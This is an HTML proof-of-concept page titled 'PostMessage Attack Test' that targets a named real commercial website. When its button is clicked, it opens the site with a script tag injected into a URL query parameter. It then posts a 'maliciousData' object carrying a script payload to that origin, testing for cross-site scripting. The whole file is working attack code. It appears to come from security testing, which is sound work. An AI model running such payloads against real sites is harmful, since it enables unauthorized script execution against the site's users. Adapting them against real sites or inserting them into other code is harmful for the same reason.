<!DOCTYPE html>
<html>
<head>
    <title>PostMessage Attack Test</title>
</head>
<body>
    <h1>PostMessage Attack Test</h1>
    <button id="sendMessage">Send Message</button>

    <script>
        document.getElementById('sendMessage').onclick = function() {
            let maliciousData = {
                isPostaMessage: true,
                topic: "malicious-topic",
                content: "<script>alert('XSS via postMessage');</script>"
            };
            
            // Open a new window/tab with the target URL
            let targetWindow = window.open('https://www.mindbodyonline.com/business/education?term_vertical=All&term_topics=<script>alert("xss")</script>&term_asset_type=534&page=4');
            
            // Wait for the new window/tab to load, then send the message
            setTimeout(() => {
                targetWindow.postMessage(maliciousData, 'https://www.mindbodyonline.com');
            }, 3000); // Adjust the timeout as necessary
        };
    </script>
</body>
</html>
